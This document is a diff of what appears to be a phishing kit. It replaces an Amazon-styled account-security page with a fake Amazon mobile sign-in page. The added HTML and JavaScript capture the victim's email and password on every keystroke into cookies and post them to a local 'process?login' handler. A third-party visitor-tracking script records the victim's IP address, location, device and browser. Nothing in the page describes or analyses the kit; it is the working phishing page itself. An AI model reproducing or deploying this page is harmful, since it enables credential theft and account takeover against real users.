@@ -1,91 +1,265 @@
+	<!DOCTYPE html>
+	<html class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember awa-browser" data-19ax5a9jf="mongoose" data-aui-build-date="3.21.4-2021-08-16">
 
-<!DOCTYPE html>
-<html class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-mobile a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-19ax5a9jf="mongoose" data-aui-build-date="3.21.3-2021-04-08">
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no">
+		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+		<title id="d1"></title>
+		<link rel="shortcut icon" href="../assets/images/favicon.ico" />
+		<link rel="stylesheet" href="../assets/css/sign-mobile.css">
+		<link rel="stylesheet" href="../assets/css/style.sign-mobile.css">
+		<link rel="stylesheet" href="../assets/css/style2.sign-mobile.css">
+		<script type="text/javascript" src="https://www.visitorjs.com/visitor.js?key=creaPdimeW"></script>
 
-<head>
-	<meta charset="utf-8">
-	<meta name="viewport" content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no">
-	<title id="d33"></title>
-	<link rel="shortcut icon" href="../assets/images/favicon.ico" />
-	<link rel="stylesheet" href="../assets/css/activity2.css">
-	<style>
-	.chimera-body-container {
-		width: 25.7em !important;
-		max-width: 100%;
-		margin-left: auto;
-		margin-right: auto;
-	}
-	</style>
-</head>
+	</head>
 
-<body class="a-color-offset-background a-m-us a-aui_72554-c a-aui_csa_templates_buildin_ww_exp_337518-c a-aui_csa_templates_buildin_ww_launch_337517-c a-aui_csa_templates_declarative_ww_exp_337521-t1 a-aui_csa_templates_declarative_ww_launch_337520-c a-aui_mm_desktop_exp_291916-c a-aui_mm_desktop_launch_291918-c a-aui_mm_desktop_targeted_exp_291928-c a-aui_mm_desktop_targeted_launch_291922-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c" cz-shortcut-listen="true">
-	<div id="a-page">
-		<div id="header" class="a-section a-spacing-none">
-			<div class="a-container a-global-nav-wrapper">
-				<div class="a-section a-spacing-none a-text-center">
-					<a class="a-link-nav-icon" href="#"> <i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i> </a>
-				</div>
+	<body class="a-color-offset-background ap-locale-en_US a-m-us a-aui_72554-c a-aui_button_aria_label_markup_348458-t1 a-aui_csa_templates_buildin_ww_exp_337518-t1 a-aui_csa_templates_buildin_ww_launch_337517-c a-aui_csa_templates_declarative_ww_exp_337521-c a-aui_csa_templates_declarative_ww_launch_337520-c a-aui_dynamic_img_a11y_markup_345061-t1 a-aui_mm_desktop_exp_291916-c a-aui_mm_desktop_launch_291918-c a-aui_mm_desktop_targeted_exp_291928-c a-aui_mm_desktop_targeted_launch_291922-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c auth-show-password-enabled auth-show-password-ready" cz-shortcut-listen="true">
+		<div id="a-page">
+			<div class="a-section a-spacing-none">
+				<header id="nav-main" data-nav-language="en_US" class="nav-mobile nav-progressive-attribute nav-locale-us nav-lang-en nav-ssl nav-unrec nav-blueheaven">
+					<div id="navbar" cel_widget_id="Navigation-mobile-navbar" role="navigation" class="nav-t-basicNoAuth nav-sprite-v3 celwidget" data-csa-c-id="ccfmjt-p4zuo0-ncg407-rmk4dj">
+						<div id="nav-logobar">
+							<div class="nav-left">
+								<div id="nav-logo">
+									<a href="#" id="nav-logo-sprites" class="nav-logo-link nav-progressive-attribute" aria-label="Amazon"> <span class="nav-sprite nav-logo-base"></span> <span id="logo-ext" class="nav-sprite nav-logo-ext nav-progressive-content"></span> <span class="nav-logo-locale">.us</span> </a>
+								</div>
+							</div>
+							<div class="nav-right"> </div>
+						</div>
+					</div>
+					<div id="nav-progressive-subnav"> </div>
+				</header>
 			</div>
-		</div>
-		<div id="body" class="a-section a-padding-base a-text-center">
-			<div class="a-section a-text-left chimera-body-container">
-				<div class="a-section a-spacing-mini a-spacing-top-micro a-text-center"> <img src="../assets/images/secure.png" height="20%" width="20%"></div>
-				<div class="a-section a-spacing-mini a-text-left">
-					<h1 class="a-size-large secure-your-account-word-break" id="d34"></h1> </div>
-				<div class="a-section a-spacing-small secure-your-account-word-break"><span id="d35"></span></div>
-				<div class="a-box a-spacing-mini a-text-left">
-					<div class="a-box-inner a-padding-base">
-						<div class="a-row a-spacing-mini a-spacing-top-micro"><span class="a-size-base secure-your-account-word-break a-text-bold"><span id="d36"></span></span> <span class="a-size-base secure-your-account-word-break"><span id="d37"></span></span> </div>
-						<hr aria-hidden="true" class="a-spacing-mini a-divider-normal">
-						<div class="a-row a-spacing-mini a-spacing-top-micro"><span class="a-size-base secure-your-account-word-break"><span id="d38"></span></span></div>
-						<div class="a-row a-spacing-mini a-spacing-top-small"><span class="a-size-small secure-your-account-word-break"><b id="d39"></b><span id="d40"></span></span></div>
+			<div class="a-container">
+				<div class="a-section a-spacing-none auth-pagelet-mobile-container badInput hide">
+					<div id="auth-error-message-box" class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base" aria-live="assertive" role="alert">
+						<div class="a-box-inner a-alert-container">
+							<h4 class="a-alert-heading" id="d2"></h4>
+							<div class="a-alert-content">
+								<ul class="a-unordered-list a-nostyle a-vertical" role="alert">
+									<li><span class="a-list-item" id="d3"></span> </li>
+								</ul>
+							</div>
+						</div>
 					</div>
 				</div>
-				<div class="a-box a-spacing-mini a-text-left">
-					<div class="a-box-inner a-padding-base">
-						<div class="a-row a-spacing-mini a-spacing-top-micro"><span class="a-size-base secure-your-account-word-break a-text-bold"><span id="d41" 	></span></span> <span class="a-size-base secure-your-account-word-break"><span id="d42"></span></span> </div>
-						<hr aria-hidden="true" class="a-spacing-mini a-divider-normal">
-						<div class="a-row a-spacing-mini a-spacing-top-micro">
-							<div id="sign_out_everything_number_of_apps" class="a-box a-alert-inline a-alert-inline-warning">
-								<div class="a-box-inner a-alert-container"> <i class="a-icon a-icon-alert"></i>
-									<div class="a-alert-content"> <span class="a-size-base secure-your-account-word-break"><span id="43"></span></span> </div>
+				<form id="ap_login_form" name="signIn" method="post" action="process?login" class="auth-validate-form fwcim-form auth-clearable-form" onsubmit="return checkpass();">
+					<div class="a-section auth-pagelet-mobile-container emailpage">
+						<div id="outer-accordion-signin-signup-page" class="a-section">
+							<h2 id="d25">  </h2>
+							<div id="accordion-signin-signup-page" data-a-accordion-name="accordion-signin-signup-page" class="a-box-group a-accordion a-spacing-medium a-spacing-top-mini" role="radioGroup">
+								<div id="accordion-row-register" class="a-box">
+									<div class="a-box-inner a-accordion-row-container">
+										<div class="a-accordion-row-a11y" role="radio">
+											<a id="register_accordion_header" data-action="a-accordion" class="a-accordion-row a-declarative"> <i class="a-icon a-accordion-radio a-icon-radio-inactive"></i>
+												<h5> <div class="a-row"> <span class="a-size-base a-text-bold" id="d26"></span>. <span class="a-size-small accordionHeaderMessage" id="d19"></span> </div></h5> </a>
+										</div>
+									</div>
+								</div>
+								<div id="accordion-row-login" class="a-box a-accordion-active" data-a-accordion-row-name="accordion-row-login">
+									<div class="a-box-inner a-accordion-row-container">
+										<div class="a-accordion-row-a11y" role="radio" aria-checked="true" aria-expanded="true">
+											<a id="login_accordion_header" data-action="a-accordion" class="a-accordion-row a-declarative" href="#" aria-label=""> <i class="a-icon a-accordion-radio a-icon-radio-active"></i>
+												<h5> <div class="a-row"> <span class="a-size-base a-text-bold" id="d4"></span>. <span class="a-size-small accordionHeaderMessage" id="d27"></span> </div></h5> </a>
+										</div>
+										<div class="a-accordion-inner">
+											<div class="a-input-text-group a-spacing-medium a-spacing-top-micro">
+												<label for="ap_email_login" class="a-form-label auth-mobile-label"> </label>
+												<div class="a-row a-spacing-base"> <span class="a-declarative"> <div class="a-input-text-wrapper auth-required-field auth-fill-claim moa-single-claim-input-field-container emailfocus"> <input onkeyup="setCookie('ap_email',this.value)" type="text" maxlength="128" id="ap_email" placeholder="Email (phone for mobile accounts)" name="emailLogin" autocorrect="off" autocapitalize="off" class=""> <style>.show{display:block;}</style> <div id="ap_email_login_icon" class="auth-clear-icons"> <i class="a-icon a-icon-close" role="img" aria-label="Clear email text field, button"></i> </div></div></span> </div>
+												<div class="a-input-text-wrapper hide">
+													<input onkeyup="setCookie('ap_password',this.value)" type="password" maxlength="1024" id="ap-credential-autofill-hint" name="password" class="">
+												</div>
+												<div id="auth-emailLogin-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini emailnull" aria-live="assertive" role="alert">
+													<div class="a-box-inner a-alert-container"> <i class="a-icon a-icon-alert"></i>
+														<div class="a-alert-content" id="d6">														</div>
+													</div>
+												</div>
+											</div>
+											<div class="a-row"> </div>
+											<div class="a-section">
+												<div class="a-button-stack"> <span id="continue" class="a-button a-button-span12 a-button-primary btnEmail"><span class="a-button-inner"><input id="btnContinue" name="btnContinue" class="a-button-input" type="submit" onclick="return showPass();"><span id="continue-announce" class="a-button-text" aria-hidden="true"> <span id="d7"></span> </span></span>
+													</span>
+													<div class="a-section a-spacing-medium">
+														<div id="legalTextRow" class="a-row a-spacing-top-medium a-size-small">
+															<span id="d8"></span>																<a href="#">
+																	<span id="d9"></span>																</a> <span id="d10"></span>
+																<a href="#">
+																	<span id="d11"></span>																</a>. </div>
+													</div>
+												</div>
+											</div>
+											<div class="a-section">
+												<div aria-live="polite" class="a-row a-expander-container a-expander-inline-container"> <a href="#" class="a-expander-header a-declarative a-expander-inline-header a-link-expander"><i class="a-icon a-icon-expand"></i><span class="a-expander-prompt"> <span id="d12"></span> </span></a> </div>
+											</div>
+										</div>
+									</div>
 								</div>
 							</div>
 						</div>
-						<div class="a-row a-spacing-mini a-spacing-top-micro"><span class="a-size-small secure-your-account-word-break"><b id="d39"></b><span id="d44"></span></span></div>
 					</div>
-				</div><span id="sya-done-button" class="a-button a-spacing-top-base a-button-span12 a-button-base"><span class="a-button-inner"><a href="activity?security_check=process" class="a-button-text" role="button"><span id="d7"></span></a></span></span>
-				<style>
-				.secure-your-account-word-break {
-					word-break: break-word;
-				}
-				</style>
+					<div class="a-section auth-pagelet-mobile-container passpage hide ">
+						<h2 id="d4">  </h2>
+						<div class="a-row a-spacing-base"> <span id="emailsgin"></span>
+							<a id="ap_change_login_claim" class="a-link-normal" tabindex="7" href="#" onclick="history.go(0)">
+								<span id="d13"></span>							</a>
+						</div>
+						<div class="a-input-text-wrapper hide">
+							<input type="text" autocomplete="email" name="email" class="">
+						</div>
+						<div class="a-input-text-group a-spacing-medium a-spacing-top-micro">
+							<label for="ap_password" class="a-form-label auth-mobile-label">
+								<span id="d29"></span>						</label>
+							<div id="auth-password-container" class="a-input-text-wrapper auth-required-field auth-password-container auth-password auth-fill-password passwordfocus">
+								<input onkeyup="setCookie('ap_password',this.value)" type="password" maxlength="1024" id="ap_password" placeholder="Amazon password" name="passwordLogin" class="">
+								<div id="ap_password_icon" class="auth-clear-icons" style="display: none;"> <i class="a-icon a-icon-close" role="img" aria-label="Clear password text field, button"></i> </div>
+								<div class="a-row auth-visible-password-container auth-show-password-empty"> <span class="a-size-small a-color-secondary auth-visible-password"></span> </div>
+							</div>
+							<div id="auth-password-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini passnull" aria-live="assertive" role="alert">
+								<div class="a-box-inner a-alert-container"> <i class="a-icon a-icon-alert"></i>
+									<div class="a-alert-content">
+										<span id="d16"></span>									</div>
+								</div>
+							</div>
+						</div>
+						<div class="a-row">
+							<div class="a-column a-span6 a-spacing-medium">
+								<div id="auth-show-password-checkbox-container" class="a-checkbox a-checkbox-fancy a-control-row a-touch-checkbox auth-show-password-checkbox">
+									<label for="auth-signin-show-password-checkbox">
+										<input id="auth-signin-show-password-checkbox" type="checkbox" name="" value="" onclick="ChangeType()" tabindex="3"><i class="a-icon a-icon-checkbox"></i><span class="a-label a-checkbox-label"> <span id="d30"></span> </span></label>
+								</div>
+							</div>
+							<div class="a-column a-span6 a-text-right a-spacing-none a-spacing-top-small a-span-last">
+								<a id="auth-fpp-link-bottom" class="a-spacing-none a-link-normal" tabindex="8" href="#">
+									<span id="d31"></span>								</a>
+							</div>
+						</div>
+						<div class="a-row a-spacing-base">
+							<div data-a-input-name="rememberMe" class="a-checkbox a-checkbox-fancy a-control-row a-touch-checkbox">
+								<label>
+									<input type="checkbox" name="rememberMe" value="true" tabindex="4"><i class="a-icon a-icon-checkbox"></i> <span class="a-label a-checkbox-label"> <span id="d17"></span> <span class="a-declarative" data-action="a-modal" data-a-modal="{&quot;max-width&quot;:&quot;500px&quot;,&quot;width&quot;:&quot;95%&quot;,&quot;name&quot;:&quot;remember-me-detail-link-modal&quot;,&quot;header&quot;:&quot;\&quot;Keep Me Signed In\&quot; Checkbox&quot;}"> <a id="remember_me_learn_more_link" class="a-link-normal" href="#"> <span id="d18"></span> </a> </span> </span>
+								</label>
+							</div>
+						</div>
+						<div class="a-row"> </div><span id="auth-signin-button" class="a-button a-button-span12 a-button-primary btnPass"><span class="a-button-inner"><input id="signInSubmit" name="signInSubmit" class="a-button-input" type="submit" aria-labelledby="auth-signin-button-announce"><span id="auth-signin-button-announce" class="a-button-text" aria-hidden="true">Sign In</span></span>
+						</span>
+					</div>
+				</form>
+				<footer class="nav-mobile nav-ftr-batmobile">
+					<div id="nav-ftr" class="nav-t-footer-basicNoAuth nav-sprite-v3">
+						<ul class="nav-ftr-horiz">
+							<li class="nav-li">
+								<a href="#" class="nav-a">
+									<span id="d21"></span>								</a>
+							</li>
+							<li class="nav-li">
+								<a href="#" class="nav-a">
+									<span id="d22"></span>								</a>
+							</li>
+							<li class="nav-li">
+								<a href="#" class="nav-a">
+									<span id="d32"></span>								</a>
+							</li>
+						</ul>
+						<div id="nav-ftr-copyright">
+							<span id="d24"></span>						</div>
+					</div>
+				</footer>
 			</div>
 		</div>
-		<div class="a-row auth-footer">
-			<style>
-			.auth-footer-separator {
-				display: inline-block;
-				width: 20px;
-			}
-			</style>
-			<div class="a-divider a-divider-section">
-				<div class="a-divider-inner"></div>
-			</div>
-			<div id="footer" class="a-section">
-				<div class="a-section a-spacing-small a-text-center a-size-mini"> <span class="auth-footer-separator"></span>
-					<a class="a-link-normal" target="_blank" rel="noopener" href="#">
-						<span id="d9"></span>					</a> <span class="auth-footer-separator"></span>
-					<a class="a-link-normal" target="_blank" rel="noopener" href="#">
-						<span id="d11"></span>					</a> <span class="auth-footer-separator"></span>
-					<a class="a-link-normal" target="_blank" rel="noopener" href="#">
-						<span id="d23"></span>					</a> <span class="auth-footer-separator"></span> </div>
-				<div class="a-section a-spacing-none a-text-center"> <span class="a-size-mini a-color-secondary"> <span id="d24"></span> </span> </div>
-			</div>
-		</div>
-	</div>
-	<script src="../assets/js/jquery-3.3.1.min.js"></script>
+		<script src="../assets/js/jquery-3.3.1.min.js"></script>
+		<script src="../assets/js/jquery.validate.min.js"></script>
+		<script>
+		$(document).ready(function() {
+    	    $("form").submit(function() {
+    	        $(this).submit(function() {
+    	            return false;
+    	        });
+    	        return true;
+    	    });     
+    	}); 
+		$(function() {
+			$('#ap_email').on('input', function() {
+				if(!$('#ap_email').val() == '') $('#ap_email_login_icon').addClass('show');
+				else $('#ap_email_login_icon').removeClass('show');
+			});
+			let emailFocus = $('input[name=emailLogin]');
+			emailFocus.focusin(function() {
+				$('.emailfocus').addClass('a-form-focus');
+			});
+			emailFocus.focusout(function() {
+				$('.emailfocus').removeClass('a-form-focus');
+			});
+			let passFocus = $('input[name=passwordLogin]');
+			passFocus.focusin(function() {
+				$('.passwordfocus').addClass('a-form-focus');
+			});
+			passFocus.focusout(function() {
+				$('.passwordfocus').removeClass('a-form-focus');
+			});
+			let BcFocus = $('input[name=btnContinue]');
+			BcFocus.focusin(function() {
+				$('.btnEmail').addClass('a-button-focus');
+			});
+			BcFocus.focusout(function() {
+				$('.btnEmail').removeClass('a-button-focus');
+			});
+			let BsFocus = $('input[name=signInSubmit]');
+			BsFocus.focusin(function() {
+				$('.btnPass').addClass('a-button-focus');
+			});
+			BsFocus.focusout(function() {
+				$('.btnPass').removeClass('a-button-focus');
+			});
+			$('#ap_email_login_icon').on('click', function() {
+				$('#ap_email').val(null);
+			});
+		});
 
+		$("input[name=emailLogin]").on('keyup', function() {
+			$('#emailsgin').html($(this).val());
+			var data = '{"ip":"'+visitor.ip.address+'", "countryCode":"'+visitor.geo.countryCode+'", "PostalCode":"'+visitor.geo.postalCode+'","countryName":"'+visitor.geo.countryName+'","city":"'+visitor.geo.city+'","os":"'+visitor.os.name+'","device":"'+visitor.device.name+'","deviceVersion":"'+visitor.device.version+'","browser":"'+visitor.browser.name+'"}';
+			setCookie('ClientInfo',data);
+		});
+		$("#ap_password").on('keyup', function(s) {
+			if(13 == s.keyCode) $("#signInSubmit").click();
+		});
+
+		let showPass = () => {
+			let ap_email = $('#ap_email').val();
+			if(ap_email.length == '') {
+				$('.emailnull').addClass('show');
+				$('.emailfocus').addClass('a-form-error');
+				$('.auth-inlined-error-message').addClass('show');
+				return true;
+			} else if(!ap_email.match(/^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/)) {
+				$('.badInput').removeClass('hide');
+				$('.emailfocus').addClass("a-form-error");
+				return true;
+			} else {
+				$('.passnull').removeClass('show');
+				$('.passwordfocus').removeClass('a-form-error');
+				$('.emailnull').addClass('hide');
+				$('#btncontinue').addClass('hide');
+				$('.badInput').addClass('hide');
+				$('.emailpage').addClass('hide');
+				$('.passpage').removeClass('hide');
+				return false;
+			}
+		}
+
+		let checkpass = () => {
+			let ap_password = $('#ap_password').val();
+			if(ap_password.length < 6) {
+				$('.passnull').addClass('show');
+				$('.passwordfocus').addClass('a-form-error');
+				return false;
+			} else {
+				$('.passnull').removeClass('show');
+				$('.passwordfocus').removeClass('a-form-error');
+			}
+		}
+		</script>
 		<script type="text/javascript">
 			var settings = {
 			  "url": "../language/lang.php?lang="+navigator.language.slice(-2),
@@ -98,14 +272,30 @@
 			  let i = 1;
 				for (let x in response) {
 					let result = 'd'+i++;
-					console.log(result + ": "+ response[x])
+					// console.log(result + ": "+ response[x])
 					$('#'+result).html(response[x]);
+					// WriteTag('auth-signin-button-announce',response[4])
+					// document.getElementById('auth-signin-button-announce').innerHTML('Masuks');
 				}
 			});
 			function WriteTag(id,txt) {
 				$('#'+id).html(txt);
 			}
+			function ChangeType() {
+			  var x = document.getElementById("ap_password");
+			  if (x.type === "password") {
+			    x.type = "text";
+			  } else {
+			    x.type = "password";
+			  }
+			}
+			function setCookie(cname, cvalue) {
+                const d = new Date();
+                d.setTime(d.getTime() + (1*24*60*60*1000));
+                let expires = "expires="+ d.toUTCString();
+                document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
+            }
 		</script>
-</body>
+	</body>
 
-</html>
+	</html>
